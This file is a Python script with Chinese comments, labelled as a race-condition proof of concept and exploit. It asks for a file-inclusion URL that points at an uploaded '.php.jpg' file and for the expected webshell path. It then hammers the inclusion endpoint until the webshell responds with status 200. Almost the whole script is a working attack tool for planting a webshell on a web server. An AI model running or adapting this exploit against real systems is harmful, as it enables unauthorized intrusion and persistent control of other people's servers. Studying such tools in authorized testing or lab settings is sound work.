import requests     # HTTP操作模块
#import tkinter as tk       #窗口模块

 # requests.get('http://httpbin.org/post')
 # requests.post('http://httpbin.org/post')
 # requests.put('http://httpbin.org/put')
 # requests.delete('http://httpbin.org/delete')
 # requests.head('http://httpbin.org/get')
 # requests.options('http://httpbin.org/get')
#root = tk.Tk()
#root.title("forGET_条件竞争漏洞_POC&exp")


url_111 = 'http://127.0.0.1/include.php?file=/upload/auto_write.php.jpg'
url_222 = 'http://127.0.0.1/sbhack.php'
#head = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'

run_ture = ""

while run_ture != "yes" or run_ture != "y" :

    #os.system('cls')
    url_1 = input("请输入竞争地址，如：" + url_111 + " \n:").strip()
    url_2 = input("\n请输入webshell地址，如：" + url_222 + " \n:").strip()

    print('\n\n' + '竞争地址："' + url_1 + '"\nshell地址："' + url_2 + '"\n')

    run_ture = input("请确认地址是否正确，正确请输入yes或y，错误请输入no或n \n:").strip().lower()
    if run_ture == "yes" or run_ture == "y" :
        break


head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Connection": "keep-alive"
}

i = 0
ii = 0
tmp_request2 = requests.get(url_2,headers = head,timeout=2)  #先赋值一次再进入循环，否则下面if匹配404会报错。
# 条件循环/无限
while 1 == 1 :
    i = i + 1
    ii = ii + 1
    #访问次数调用

    tmp_request = requests.get(url_1,headers = head,timeout=2)
    if ii > 20 :  #每竞争二十次确认一次写shell,是否成功。最好不要每次竞争都确认shell，防止服务器访问过载，可能导致竞争失败。
        ii = 0
        tmp_request2 = requests.get(url_2,headers = head,timeout=2)
        print('确认写shell：' + ' ---- ' + str(tmp_request2.status_code) + ' ---- ' + url_2)

    if tmp_request2.status_code == 404:
        print(str(i) + ' ---- ' + 'Failed' + ' ---- ' + str(tmp_request.status_code) + ' ---- ' + url_1)
    elif tmp_request2.status_code == 200:
        print('\n' + 'Sucess!' + ' ---- ' + url_2 + ' ---- ' + str(tmp_request2.status_code))
        break
    else:
        print('\n' + '未知错误!' + '\n')
        print('url_1:' + url_1 + ' ---- ' + str(tmp_request.status_code))
        print('\nurl_2:' + url_2 + ' ---- ' + str(tmp_request2.status_code))
        break 

# 等待用户输入,按任意键退出！
input("\n\n按回车键退出！Press Enter to exit...\n")

